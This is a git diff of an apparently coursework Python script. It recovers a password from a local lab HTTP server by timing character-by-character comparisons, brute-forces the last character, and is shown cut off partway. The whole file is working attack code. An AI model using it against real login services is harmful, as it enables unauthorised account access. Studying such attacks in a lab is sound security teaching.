@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
-Timing Side-Channel Attack Script
-==================================
-Exploits character-by-character password comparison timing differences
-to crack passwords through statistical analysis of response times.
+Timing Side-Channel Attack Script - SIMPLIFIED MULTI-THREADED
+==============================================================
+Based on proven simple sum-and-average approach with thread safety.
 
 Author: df
 Course: Attacks on Implementations of Secure Systems
@@ -12,51 +11,39 @@ Assignment: Homework 1 - Temporal Side-Channel
 
 import argparse
 import requests
-import statistics
 import time
 import logging
 from typing import List, Tuple, Dict, Optional
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from datetime import datetime
 import sys
-from scipy import stats  # For t-test
+import threading
 
 
 # ============================================================================
 # CONFIGURATION CONSTANTS
 # ============================================================================
 
-# Default values
-DEFAULT_USERNAME = "316279942"  # Replace with your student ID
+DEFAULT_USERNAME = "316279942"
 DEFAULT_DIFFICULTY = 1
 DEFAULT_SERVER = "http://127.0.0.1"
 DEFAULT_PORT = 80
 
-# Timing attack parameters (increased for local Docker)
-DEFAULT_BASE_SAMPLES = 4       # Initial number of timing samples per character (was 30)
-DEFAULT_THREADS = 6             # Number of parallel threads (1 for accurate timing, increase for speed)
-MAX_PASSWORD_LENGTH = 32        # Maximum password length to test
-LENGTH_DETECTION_SAMPLES = 4   # Samples for length detection (was 25)
-
-# Statistical thresholds (adjusted for local Docker with small timing differences)
-HIGH_CONFIDENCE_ZSCORE = 1.8    # Z-score threshold for high confidence (lowered from 2.5)
-MEDIUM_CONFIDENCE_ZSCORE = 0.8  # Z-score threshold for medium confidence (lowered from 1.5)
-MEDIUM_ADDITIONAL_SAMPLES = 4  # Additional samples for medium confidence (increased from 20)
-LOW_ADDITIONAL_SAMPLES = 4     # Additional samples for low confidence (increased from 40)
+# Simplified parameters
+DEFAULT_BASE_SAMPLES = 4
+DEFAULT_THREADS = 4            # Conservative for stability
+MAX_PASSWORD_LENGTH = 32
+LENGTH_DETECTION_SAMPLES = 4
 
 # Character set
 CHARSET = "abcdefghijklmnopqrstuvwxyz"
 
-# Statistical test method
-DEFAULT_STAT_TEST = "z-score"  # Options: "z-score" or "t-test"
-
-# Backtracking parameters
-MAX_BACKTRACK_DEPTH = 3         # Maximum number of positions to backtrack
-TOP_CANDIDATES_TO_KEEP = 3      # Number of top candidates to store per position
-
 # Request timeout
-REQUEST_TIMEOUT = 80            # Seconds
+REQUEST_TIMEOUT = 80
+
+# Thread-local storage for sessions
+thread_local = threading.local()
 
 
 # ============================================================================
@@ -64,25 +51,13 @@ REQUEST_TIMEOUT = 80            # Seconds
 # ============================================================================
 
 @dataclass
-class TimingResult:
-    """Stores timing measurement results for a character guess."""
+class CharacterResult:
+    """Simple result for a character test."""
     character: str
-    median: float
-    std_dev: float
+    total_time: float      # Sum of all samples
     samples: int
-    z_score: float = 0.0
-    raw_timings: List[float] = field(default_factory=list)  # Store actual timing measurements
-    average: float = 0.0  # Average (mean) timing
-
-
-@dataclass
-class PositionResult:
-    """Stores the cracking result for a specific password position."""
-    position: int
-    character: str
-    confidence: str  # 'HIGH', 'MEDIUM', 'LOW'
-    timing_result: TimingResult
-    candidates: List[TimingResult]
+    average_time: float    # total_time / samples
+    sample_times: List[float]  # Individual measurements
 
 
 # ============================================================================
@@ -90,19 +65,10 @@ class PositionResult:
 # ============================================================================
 
 def setup_logging(username: str) -> str:
-    """
-    Setup logging configuration for both file and console output.
-
-    Args:
-        username: Username being attacked (for log filename)
-
-    Returns:
-        Path to the log file
-    """
+    """Setup logging configuration."""
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     log_filename = f"timing_attack_{username}_{timestamp}.log"
 
-    # File handler - detailed logs
     file_handler = logging.FileHandler(log_filename)
     file_handler.setLevel(logging.DEBUG)
     file_formatter = logging.Formatter(
@@ -111,19 +77,16 @@ def setup_logging(username: str) -> str:
     )
     file_handler.setFormatter(file_formatter)
 
-    # Console handler - minimal output
     console_handler = logging.StreamHandler(sys.stderr)
     console_handler.setLevel(logging.INFO)
     console_formatter = logging.Formatter('%(message)s')
     console_handler.setFormatter(console_formatter)
 
-    # Setup root logger
     logger = logging.getLogger()
     logger.setLevel(logging.DEBUG)
     logger.addHandler(file_handler)
     logger.addHandler(console_handler)
 
-    # Suppress DEBUG logs from requests and urllib3 libraries
     logging.getLogger('urllib3').setLevel(logging.WARNING)
     logging.getLogger('requests').setLevel(logging.WARNING)
 
@@ -131,211 +94,75 @@ def setup_logging(username: str) -> str:
 
 
 # ============================================================================
-# HTTP REQUEST FUNCTIONS
+# SESSION MANAGEMENT - THREAD-SAFE
 # ============================================================================
 
-def create_session() -> requests.Session:
-    """
-    Create a requests session with optimized settings for timing attacks.
-
-    Returns:
-        Configured requests.Session object
-    """
-    session = requests.Session()
-    # Keep connection alive for better timing consistency
-    session.headers.update({'Connection': 'keep-alive'})
-    return session
+def get_thread_session() -> requests.Session:
+    """Get a session for the current thread."""
+    if not hasattr(thread_local, 'session'):
+        thread_local.session = requests.Session()
+        thread_local.session.headers.update({'Connection': 'keep-alive'})
+    return thread_local.session
 
 
-def measure_request_time(
-    session: requests.Session,
+# ============================================================================
+# SIMPLE TIMING MEASUREMENT (like your working code)
+# ============================================================================
+
+def test_character_simple(
     url: str,
     username: str,
-    password: str,
-    difficulty: int
-) -> float:
+    test_password: str,
+    difficulty: int,
+    samples: int,
+    char: str,
+    position: int
+) -> CharacterResult:
     """
-    Measure the time taken for a single password check request.
-
-    Args:
-        session: Requests session to use
-        url: Base URL of the password checking server
-        username: Username to test
-        password: Password to test
-        difficulty: Difficulty level
-
-    Returns:
-        Request time in seconds, or float('inf') on error
+    Test a single character using simple sum-and-average approach.
+    This matches your working code's logic.
     """
+    session = get_thread_session()
+
     params = {
         'user': username,
-        'password': password,
+        'password': test_password,
         'difficulty': difficulty
     }
 
-    try:
-        start_time = time.perf_counter()
-        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
-        elapsed_time = time.perf_counter() - start_time
+    total_time = 0.0
+    sample_times = []
 
-        # Log if we get an unexpected response
-        if response.status_code != 200:
-            logging.warning(f"Unexpected status code {response.status_code} for password: {password}")
+    logging.debug(f"Testing '{char}' for position {position}, password='{test_password}'")
 
-        return elapsed_time
+    for sample_num in range(samples):
+        try:
+            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
 
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Request failed for password '{password}': {e}")
-        return float('inf')
+            # Use response.elapsed.total_seconds() like your working code
+            elapsed = response.elapsed.total_seconds()
+            total_time += elapsed
+            sample_times.append(elapsed)
 
+            logging.debug(f"  Sample {sample_num + 1}/{samples} for '{char}': {elapsed:.6f}s "
+                         f"(running total: {total_time:.6f}s, running avg: {total_time/(sample_num+1):.6f}s)")
 
-def time_request(
-    session: requests.Session,
-    url: str,
-    username: str,
-    password: str,
-    difficulty: int,
-    samples: int
-) -> Tuple[float, float, List[float], float]:
-    """
-    Perform multiple timing measurements and calculate statistics.
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request failed for '{char}': {e}")
+            # Don't add to total on error
 
-    Args:
-        session: Requests session to use
-        url: Base URL of the password checking server
-        username: Username to test
-        password: Password to test
-        difficulty: Difficulty level
-        samples: Number of samples to collect
+    avg_time = total_time / samples if samples > 0 else 0.0
 
-    Returns:
-        Tuple of (median_time, std_dev, all_timings, average_time)
-    """
-    timings = []
+    logging.debug(f"Finished testing '{char}' for position {position}: "
+                 f"total={total_time:.6f}s, avg={avg_time:.6f}s")
 
-    for _ in range(samples):
-        timing = measure_request_time(session, url, username, password, difficulty)
-        if timing != float('inf'):
-            timings.append(timing)
-
-    if not timings:
-        logging.error(f"All requests failed for password: {password}")
-        return (float('inf'), float('inf'), [], float('inf'))
-
-    median = statistics.median(timings)
-    std_dev = statistics.stdev(timings) if len(timings) > 1 else 0.0
-    average = statistics.mean(timings)
-
-    return (median, std_dev, timings, average)
-
-
-# ============================================================================
-# STATISTICAL ANALYSIS
-# ============================================================================
-
-def calculate_z_score(value: float, population: List[float]) -> float:
-    """
-    Calculate the z-score of a value relative to a population.
-
-    Args:
-        value: The value to calculate z-score for
-        population: List of all values in the population
-
-    Returns:
-        Z-score (number of standard deviations from mean)
-    """
-    if len(population) < 2:
-        return 0.0
-
-    mean = statistics.mean(population)
-    std_dev = statistics.stdev(population)
-
-    if std_dev == 0:
-        return 0.0
-
-    return (value - mean) / std_dev
-
-
-def calculate_t_test_score(winner_timings: List[float], other_timings: List[float]) -> float:
-    """
-    Calculate t-test score comparing winner's timings against all other timings.
-    Higher positive value = winner is significantly slower (more likely correct).
-
-    Args:
-        winner_timings: Raw timing measurements for the winning character
-        other_timings: Raw timing measurements for all other characters combined
-
-    Returns:
-        T-test statistic (positive = winner is slower)
-    """
-    if len(winner_timings) < 2 or len(other_timings) < 2:
-        return 0.0
-
-    # Perform independent samples t-test
-    # We expect winner to be SLOWER (higher values), so we check if winner > others
-    t_statistic, p_value = stats.ttest_ind(winner_timings, other_timings)
-
-    # Return t-statistic (positive = winner is significantly slower)
-    return t_statistic
-
-
-def analyze_timing_results(
-    results: List[TimingResult],
-    test_method: str = "z-score"
-) -> List[TimingResult]:
-    """
-    Analyze timing results and calculate statistical scores for each character.
-
-    Args:
-        results: List of TimingResult objects
-        test_method: "z-score" or "t-test"
-
-    Returns:
-        List of TimingResult objects sorted by median time (descending)
-        with statistical scores calculated
-    """
-    # Extract all median values
-    medians = [r.median for r in results if r.median != float('inf')]
-
-    if not medians:
-        return results
-
-    if test_method == "t-test":
-        # For t-test, we need to compare each character's raw timings against all others
-        # Sort by median first
-        results_sorted = sorted(results, key=lambda r: r.median, reverse=True)
-
-        # Calculate t-test for the winner against all others
-        if len(results_sorted) > 1:
-            winner = results_sorted[0]
-
-            # Collect all raw timings from non-winner characters
-            other_timings = []
-            for r in results_sorted[1:]:
-                if r.raw_timings and r.median != float('inf'):
-                    other_timings.extend(r.raw_timings)
-
-            if winner.raw_timings and other_timings:
-                winner.z_score = calculate_t_test_score(winner.raw_timings, other_timings)
-
-            # For other characters, calculate t-test against the winner
-            for r in results_sorted[1:]:
-                if r.raw_timings and winner.raw_timings:
-                    # Negative t-score since they're slower than winner
-                    r.z_score = -calculate_t_test_score(winner.raw_timings, r.raw_timings)
-
-        return results_sorted
-
-    else:  # z-score (default)
-        # Calculate z-scores for each result
-        for result in results:
-            if result.median != float('inf'):
-                result.z_score = calculate_z_score(result.median, medians)
-
-        # Sort by median time (descending - slower is more likely correct)
-        results_sorted = sorted(results, key=lambda r: r.median, reverse=True)
-
-        return results_sorted
+    return CharacterResult(
+        character=char,
+        total_time=total_time,
+        samples=samples,
+        average_time=avg_time,
+        sample_times=sample_times
+    )
 
 
 # ============================================================================
@@ -343,589 +170,275 @@ def analyze_timing_results(
 # ============================================================================
 
 def detect_password_length(
-    session: requests.Session,
     url: str,
     username: str,
     difficulty: int,
     max_length: int = MAX_PASSWORD_LENGTH,
     samples: int = LENGTH_DETECTION_SAMPLES
 ) -> int:
-    """
-    Detect the password length by testing different lengths.
-    The correct length will take longest to fail (more characters compared).
-
-    Args:
-        session: Requests session to use
-        url: Base URL of the server
-        username: Username to test
-        difficulty: Difficulty level
-        max_length: Maximum length to test
-        samples: Number of samples per length
-
-    Returns:
-        Detected password length
-    """
+    """Detect password length using simple approach."""
     logging.info("[*] Detecting password length...")
 
-    length_timings = {}
+    length_results = {}
 
-    def test_length(length: int) -> Tuple[int, float]:
-        """Test a specific password length."""
-        # Create a password of wrong characters with the specified length
+    for length in range(1, max_length + 1):
         test_password = 'z' * length
-        median, _, _, _ = time_request(session, url, username, test_password, difficulty, samples)
-        return (length, median)
 
-    # Test all lengths in parallel
-    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
-        futures = {executor.submit(test_length, length): length
-                  for length in range(1, max_length + 1)}
+        result = test_character_simple(
+            url, username, test_password, difficulty, samples,
+            f"len{length}", length
+        )
 
-        for future in as_completed(futures):
-            length, median = future.result()
-            length_timings[length] = median
-            logging.debug(f"  Length {length:2d}: {median:.6f}s")
+        length_results[length] = result.average_time
+        logging.debug(f"  Length {length:2d}: avg={result.average_time:.6f}s")
 
-    # Find the length with the maximum median time
-    detected_length = max(length_timings, key=length_timings.get)
-    max_time = length_timings[detected_length]
+    # Find length with maximum average time
+    detected_length = max(length_results, key=length_results.get)
+    max_time = length_results[detected_length]
 
-    # Show top 5 lengths for analysis
-    sorted_lengths = sorted(length_timings.items(), key=lambda x: x[1], reverse=True)
-    logging.info(f"[+] Password length detected: {detected_length} characters "
-                f"(timing: {max_time:.6f}s)")
+    sorted_lengths = sorted(length_results.items(), key=lambda x: x[1], reverse=True)
+    logging.info(f"[+] Password length detected: {detected_length} characters (avg time: {max_time:.6f}s)")
     logging.info(f"  Top 5 length candidates:")
-    for length, timing in sorted_lengths[:5]:
-        logging.info(f"    Length {length:2d}: {timing:.6f}s")
-
-    # Sanity check: if multiple lengths are very close, warn about uncertainty
-    second_best_time = sorted_lengths[1][1] if len(sorted_lengths) > 1 else 0
-    if max_time - second_best_time < 0.01:  # Less than 10ms difference
-        logging.warning(f"[!] Length detection has low confidence - "
-                       f"difference between top two: {max_time - second_best_time:.6f}s")
-        logging.warning(f"[!] If cracking fails, the password length might be wrong.")
+    for length, avg_time in sorted_lengths[:5]:
+        logging.info(f"    Length {length:2d}: {avg_time:.6f}s")
 
     return detected_length
 
 
 # ============================================================================
-# CHARACTER TESTING
-# ============================================================================
-
-def test_character(
-    url: str,
-    username: str,
-    known_prefix: str,
-    char: str,
-    difficulty: int,
-    samples: int,
-    password_length: int  # CRITICAL: Need total password length for padding
-) -> TimingResult:
-    """
-    Test a single character at the current position.
-    Creates its own session to ensure thread safety.
-
-    Args:
-        url: Base URL of the server
-        username: Username to test
-        known_prefix: Already cracked password prefix
-        char: Character to test
-        difficulty: Difficulty level
-        samples: Number of timing samples
-        password_length: Total password length (for padding)
-
-    Returns:
-        TimingResult object with timing statistics
-    """
-    # Create a new session for this character to ensure thread safety
-    session = create_session()
-
-    # CRITICAL: Pad to full password length!
-    current_length = len(known_prefix) + 1  # prefix + this character
-    padding_needed = password_length - current_length
-    test_password = known_prefix + char + ('a' * padding_needed)
-
-    logging.debug(f"Testing char '{char}': password='{test_password}' (prefix='{known_prefix}', padding={'a'*padding_needed})")
-
-    median, std_dev, raw_timings, average = time_request(session, url, username, test_password, difficulty, samples)
-    session.close()  # Clean up
-
-    return TimingResult(
-        character=char,
-        median=median,
-        std_dev=std_dev,
-        samples=samples,
-        raw_timings=raw_timings,  # Store the actual timings!
-        average=average  # Store the average
-    )
-
-
-def test_all_characters(
-    url: str,
-    username: str,
-    known_prefix: str,
-    difficulty: int,
-    samples: int,
-    threads: int,
-    password_length: int  # CRITICAL: Need for padding
-) -> List[TimingResult]:
-    """
-    Test all characters in the charset at the current position using parallel threads.
-    Each thread creates its own session for thread safety.
-
-    Args:
-        url: Base URL of the server
-        username: Username to test
-        known_prefix: Already cracked password prefix
-        difficulty: Difficulty level
-        samples: Number of timing samples per character
-        threads: Number of parallel threads
-        password_length: Total password length (for padding)
-
-    Returns:
-        List of TimingResult objects for all characters
-    """
-    results = []
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {
-            executor.submit(
-                test_character,
-                url, username, known_prefix, char, difficulty, samples, password_length
-            ): char
-            for char in CHARSET
-        }
-
-        for future in as_completed(futures):
-            result = future.result()
-            results.append(result)
-
-    return results
-
-
-# ============================================================================
-# CHARACTER CRACKING WITH ADAPTIVE SAMPLING
+# CHARACTER CRACKING - SIMPLIFIED WITH OPTIONAL THREADING
 # ============================================================================
 
 def crack_character_at_position(
     url: str,
     username: str,
-    known_prefix: str,
+    current_password: str,
     position: int,
+    password_length: int,
     difficulty: int,
-    base_samples: int,
-    threads: int,
-    password_length: int,  # CRITICAL: Need for padding
-    test_method: str = "z-score"  # "z-score" or "t-test"
-) -> PositionResult:
+    samples: int,
+    use_threads: bool = True,
+    max_workers: int = 4
+) -> str:
     """
-    Crack a single character at the specified position with adaptive sampling.
-
-    Args:
-        url: Base URL of the server
-        username: Username to test
-        known_prefix: Already cracked password prefix
-        position: Current position (0-indexed)
-        difficulty: Difficulty level
-        base_samples: Initial number of samples
-        threads: Number of parallel threads
-        password_length: Total password length (for padding)
-        test_method: "z-score" or "t-test"
-
-    Returns:
-        PositionResult with the cracked character and confidence level
+    Crack a single character position using simple sum-and-average.
+    Matches your working code's logic but with optional threading.
     """
-    # Show progress
-    current_display = known_prefix if known_prefix else "[empty]"
-    logging.info(f"\n[Position {position + 1}] Current password: '{current_display}' - Testing next character...")
-    logging.info(f"  Statistical test method: {test_method}")
+    logging.info(f"\n[Position {position}] Current password: '{current_password}' - Testing next character...")
 
-    # Initial testing with base samples
-    results = test_all_characters(
-        url, username, known_prefix, difficulty, base_samples, threads, password_length
-    )
+    start_time = time.time()
 
-    # Analyze results and calculate statistical scores
-    results = analyze_timing_results(results, test_method)
+    # Build test passwords for all characters
+    char_results = {}
 
-    winner = results[0]
-    winner_score = winner.z_score  # Using z_score field for both z-score and t-score
-    score_name = "t-score" if test_method == "t-test" else "z-score"
+    if use_threads:
+        # Multi-threaded testing
+        logging.debug(f"  Testing {len(CHARSET)} characters with {max_workers} threads")
 
-    # Display ALL 26 characters with their timings
-    logging.info(f"  ALL character timings ({base_samples} samples each):")
-    for i, r in enumerate(results):
-        rank_symbol = f"#{i+1:2d}"
-        # Show summary statistics
-        logging.info(f"    {rank_symbol} '{r.character}': median={r.median:.6f}s, avg={r.average:.6f}s, {score_name}={r.z_score:+.2f}, std_dev={r.std_dev:.6f}s")
-        # Show all raw timing measurements
-        timings_str = ', '.join([f'{t:.6f}' for t in r.raw_timings])
-        logging.debug(f"         Raw timings: [{timings_str}]")
-
-    logging.info(f"")
-    logging.info(f"  Top candidate: '{winner.character}' ({score_name}={winner_score:.2f})")
-
-    # Determine confidence and adaptive sampling
-    if winner_score > HIGH_CONFIDENCE_ZSCORE:
-        confidence = "HIGH"
-        logging.info(f"[+] Found: '{winner.character}' "
-                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [HIGH]")
-
-    elif winner_score > MEDIUM_CONFIDENCE_ZSCORE:
-        confidence = "MEDIUM"
-        logging.info(f"[~] Candidate: '{winner.character}' "
-                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [MEDIUM] - verifying...")
-
-        # Take additional samples for top 3 candidates
-        top_candidates = results[:3]
-        refined_results = []
-
-        logging.info(f"  Taking {MEDIUM_ADDITIONAL_SAMPLES} more samples for top 3 candidates...")
-
-        for candidate in top_candidates:
-            logging.info(f"    Testing '{candidate.character}' (initial: median={candidate.median:.6f}s, {score_name}={candidate.z_score:.2f})...")
-
-            additional_result = test_character(
-                url, username, known_prefix, candidate.character,
-                difficulty, MEDIUM_ADDITIONAL_SAMPLES, password_length
+        def test_char(char):
+            test_password = current_password + char + 'a' * (password_length - position)
+            return test_character_simple(
+                url, username, test_password, difficulty, samples, char, position
             )
 
-            logging.info(f"      -> New measurement: median={additional_result.median:.6f}s ({MEDIUM_ADDITIONAL_SAMPLES} samples)")
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(test_char, char): char for char in CHARSET}
 
-            # Combine ACTUAL raw timings (not repeated medians!)
-            total_samples = candidate.samples + additional_result.samples
-            all_timings = candidate.raw_timings + additional_result.raw_timings
-            combined_median = statistics.median(all_timings)
-            combined_std_dev = statistics.stdev(all_timings) if len(all_timings) > 1 else 0.0
-            combined_average = statistics.mean(all_timings)
-
-            logging.info(f"      -> Combined: median={combined_median:.6f}s, avg={combined_average:.6f}s ({total_samples} total samples)")
-
-            refined_result = TimingResult(
-                character=candidate.character,
-                median=combined_median,
-                std_dev=combined_std_dev,
-                samples=total_samples,
-                raw_timings=all_timings,  # Keep the combined raw timings
-                average=combined_average
-            )
-            refined_results.append(refined_result)
-
-        # Re-analyze with combined samples
-        results = analyze_timing_results(refined_results + results[3:], test_method)
-        winner = results[0]
-        winner_score = winner.z_score
-
-        logging.info(f"")
-        logging.info(f"  After re-analysis, top 3 candidates:")
-        for i, r in enumerate(results[:3]):
-            logging.info(f"    #{i+1} '{r.character}': median={r.median:.6f}s, {score_name}={r.z_score:.2f}, samples={r.samples}")
-
-        logging.info(f"[+] Confirmed: '{winner.character}' "
-                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [CONFIRMED]")
-
+            for future in as_completed(futures):
+                result = future.result()
+                char_results[result.character] = result
     else:
-        confidence = "LOW"
-        logging.warning(f"[!] Low confidence: '{winner.character}' "
-                       f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [LOW] - deep verification...")
+        # Sequential testing (like your original code)
+        logging.debug(f"  Testing {len(CHARSET)} characters sequentially")
 
-        # Take many additional samples for top 5 candidates
-        top_candidates = results[:5]
-        refined_results = []
-
-        logging.info(f"  Taking {LOW_ADDITIONAL_SAMPLES} more samples for top 5 candidates...")
-
-        for candidate in top_candidates:
-            logging.info(f"    Testing '{candidate.character}' (initial: median={candidate.median:.6f}s, {score_name}={candidate.z_score:.2f})...")
-
-            additional_result = test_character(
-                url, username, known_prefix, candidate.character,
-                difficulty, LOW_ADDITIONAL_SAMPLES, password_length
+        for char in CHARSET:
+            test_password = current_password + char + 'a' * (password_length - position)
+            result = test_character_simple(
+                url, username, test_password, difficulty, samples, char, position
             )
+            char_results[char] = result
 
-            logging.info(f"      -> New measurement: median={additional_result.median:.6f}s ({LOW_ADDITIONAL_SAMPLES} samples)")
+    # Sort by average time (descending - slower is more likely correct)
+    sorted_chars = sorted(char_results.keys(),
+                         key=lambda c: char_results[c].average_time,
+                         reverse=True)
 
-            # Combine ACTUAL raw timings (not repeated medians!)
-            total_samples = candidate.samples + additional_result.samples
-            all_timings = candidate.raw_timings + additional_result.raw_timings
-            combined_median = statistics.median(all_timings)
-            combined_std_dev = statistics.stdev(all_timings) if len(all_timings) > 1 else 0.0
-            combined_average = statistics.mean(all_timings)
+    best_char = sorted_chars[0]
+    best_avg = char_results[best_char].average_time
 
-            logging.info(f"      -> Combined: median={combined_median:.6f}s, avg={combined_average:.6f}s ({total_samples} total samples)")
+    elapsed = time.time() - start_time
+    logging.info(f"  Testing completed in {elapsed:.2f}s")
+    logging.info(f"\n  Top 5 candidates for position {position}:")
 
-            refined_result = TimingResult(
-                character=candidate.character,
-                median=combined_median,
-                std_dev=combined_std_dev,
-                samples=total_samples,
-                raw_timings=all_timings,
-                average=combined_average
-            )
-            refined_results.append(refined_result)
+    for i, char in enumerate(sorted_chars[:5]):
+        result = char_results[char]
+        diff = result.average_time - best_avg
 
-        # Re-analyze with combined samples
-        results = analyze_timing_results(refined_results + results[5:], test_method)
-        winner = results[0]
-        winner_score = winner.z_score
+        logging.info(f"    #{i+1} Char: '{char}', "
+                    f"Total Time: {result.total_time:.6f}s, "
+                    f"Avg Time: {result.average_time:.6f}s, "
+                    f"Diff from best: {diff:+.6f}s")
 
-        logging.info(f"")
-        logging.info(f"  After re-analysis, top 3 candidates:")
-        for i, r in enumerate(results[:3]):
-            logging.info(f"    #{i+1} '{r.character}': median={r.median:.6f}s, {score_name}={r.z_score:.2f}, samples={r.samples}")
+        # Show individual sample times
+        samples_str = ', '.join([f'{t:.6f}' for t in result.sample_times])
+        logging.debug(f"         Sample times: [{samples_str}]")
 
-        logging.warning(f"[+] Best guess: '{winner.character}' "
-                       f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f})")
+    logging.info(f"\n[+] Detected character at position {position}: '{best_char}'")
 
-    # Keep top candidates for potential backtracking
-    top_candidates = results[:TOP_CANDIDATES_TO_KEEP]
-
-    return PositionResult(
-        position=position,
-        character=winner.character,
-        confidence=confidence,
-        timing_result=winner,
-        candidates=top_candidates
-    )
+    return best_char
 
 
 # ============================================================================
-# FINAL CHARACTER BRUTE FORCE
+# LAST CHARACTER CHECK (exact match from your code)
 # ============================================================================
 
-def brute_force_final_character(
-    session: requests.Session,
+def check_last_char(
     url: str,
     username: str,
-    known_prefix: str,
+    current_password: str,
     difficulty: int
 ) -> Optional[str]:
     """
-    Brute force the final character by trying all 26 letters and checking
-    which one returns '1' (correct password).
-
-    Args:
-        session: Requests session to use
-        url: Base URL of the server
-        username: Username to test
-        known_prefix: Already cracked password prefix (missing only last char)
-        difficulty: Difficulty level
-
-    Returns:
-        The correct final character, or None if not found
+    Check last character by brute force (looking for response='1').
+    Exact implementation from your working code.
     """
-    logging.info(f"\n[Final Position] Brute-forcing final character...")
-    logging.info(f"  Current password: '{known_prefix}' - Testing all 26 letters...")
+    password_length = len(current_password) + 1
+    logging.info(f"\n[Last Character] Testing position {password_length}...")
+    logging.info(f"  Current password: '{current_password}'")
+
+    session = get_thread_session()
 
     for char in CHARSET:
-        test_password = known_prefix + char
+        test_password = current_password + char
 
-        try:
-            params = {
-                'user': username,
-                'password': test_password,
-                'difficulty': difficulty
-            }
-            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
-
-            logging.info(f"    Testing '{char}': response='{response.text.strip()}'")
-
-            if '1' in response.text or response.text.strip() == '1':
-                logging.info(f"  [SUCCESS] Final character found: '{char}'")
-                logging.info(f"  Complete password: '{test_password}'")
-                return char
-
-        except requests.exceptions.RequestException as e:
-            logging.error(f"    Request failed for character '{char}': {e}")
-            continue
-
-    logging.error(f"  [FAILED] Could not find correct final character!")
-    return None
-
-
-# ============================================================================
-# MAIN CRACKING LOGIC
-# ============================================================================
-
-def crack_password(
-    url: str,
-    username: str,
-    difficulty: int,
-    threads: int = DEFAULT_THREADS,
-    base_samples: int = DEFAULT_BASE_SAMPLES,
-    manual_length: int = None,
-    test_method: str = "z-score"  # "z-score" or "t-test"
-) -> str:
-    """
-    Main function to crack the password using timing side-channel attack.
-
-    Args:
-        url: Base URL of the password checking server
-        username: Username to attack
-        difficulty: Difficulty level
-        threads: Number of parallel threads
-        base_samples: Initial number of timing samples
-        manual_length: Manually specified password length (skips detection)
-        test_method: Statistical test method ("z-score" or "t-test")
-
-    Returns:
-        The cracked password
-    """
-    session = create_session()
-    start_time = time.time()
-
-    # Phase 1: Detect password length (or use manual length)
-    if manual_length:
-        password_length = manual_length
-        logging.info(f"[*] Using manually specified password length: {password_length}")
-    else:
-        password_length = detect_password_length(session, url, username, difficulty)
-
-    # Phase 2: Crack each character (except the last one)
-    logging.info(f"\n[*] Starting character-by-character cracking...")
-    logging.info(f"[*] Using statistical test: {test_method}")
-
-    position_results = []
-    known_password = ""
-    position = 0
-
-    # Crack all positions except the last using timing attack
-    while position < password_length - 1:  # Stop before last character
-        result = crack_character_at_position(
-            url, username, known_password, position,
-            difficulty, base_samples, threads, password_length, test_method
-        )
-
-        position_results.append(result)
-        known_password += result.character
-
-        # Display current progress
-        logging.info(f"[Progress] Password so far: '{known_password}' ({len(known_password)}/{password_length} characters)")
-
-        # Verify character by testing if adding it increases response time
-        # (optional sanity check for very low confidence results)
-        if result.confidence == "LOW" and len(known_password) > 1:
-            # Quick verification: test the current password vs previous password
-            prev_password = known_password[:-1] + 'z'  # wrong char
-            current_time, _, _, _ = time_request(session, url, username, known_password, difficulty, 10)
-            wrong_time, _, _, _ = time_request(session, url, username, prev_password, difficulty, 10)
-
-            if current_time <= wrong_time:
-                logging.warning(f"[!] Sanity check: Current char '{result.character}' may be wrong "
-                              f"(current: {current_time:.6f}s vs wrong: {wrong_time:.6f}s)")
-
-        # NOTE: Backtracking disabled to prevent infinite loops with low confidence
-        # On local Docker, timing differences are very small and confidence is naturally lower
-        # The script will just pick the best candidate and move forward
-
-        position += 1
-
-    # Phase 3: Brute-force the final character
-    logging.info(f"\n[*] Skipping timing attack for final character - using brute force instead")
-    final_char = brute_force_final_character(session, url, username, known_password, difficulty)
-
-    if final_char:
-        known_password += final_char
-        position_results.append(PositionResult(
-            position=position,
-            character=final_char,
-            confidence="VERIFIED",
-            timing_result=TimingResult(
-                character=final_char,
-                median=0.0,
-                std_dev=0.0,
-                samples=1,
-                average=0.0
-            ),
-            candidates=[]
-        ))
-    else:
-        logging.error(f"[!] Failed to brute-force final character!")
-        # Fall back to timing attack for last character if brute force fails
-        logging.info(f"[*] Falling back to timing attack for final character...")
-        result = crack_character_at_position(
-            url, username, known_password, position,
-            difficulty, base_samples, threads, password_length, test_method
-        )
-        position_results.append(result)
-        known_password += result.character
-
-    # Phase 3: Verify the cracked password
-    logging.info(f"\n[*] Verifying cracked password: '{known_password}'")
-    test_password = known_password
-
-    try:
         params = {
             'user': username,
             'password': test_password,
             'difficulty': difficulty
         }
-        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
 
-        if '1' in response.text or response.text.strip() == '1':
-            logging.info(f"[SUCCESS] Password verified successfully!")
-        else:
-            logging.error(f"[FAILED] Password verification failed. Response: {response.text}")
-            logging.error(f"[!] The cracked password '{known_password}' is incorrect.")
-            logging.error(f"")
-            logging.error(f"Troubleshooting suggestions:")
-            logging.error(f"  1. Try with more samples: --samples 100 or --samples 150")
-            logging.error(f"  2. Length might be wrong (detected: {password_length})")
-            logging.error(f"     Try nearby lengths: --length {password_length-1} or --length {password_length+1}")
-            logging.error(f"  3. Test on remote server instead of local Docker")
-            logging.error(f"  4. Check the log file for low confidence positions")
+        try:
+            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
+            response_text = response.text.strip()
 
-    except Exception as e:
-        logging.error(f"[FAILED] Verification request failed: {e}")
+            logging.debug(f"  Char: '{char}', Response: '{response_text}'")
 
-    # Calculate and log statistics
+            if response_text == "1":
+                logging.info(f"[SUCCESS] Found correct last character: '{char}'")
+                return char
+
+        except requests.exceptions.RequestException as e:
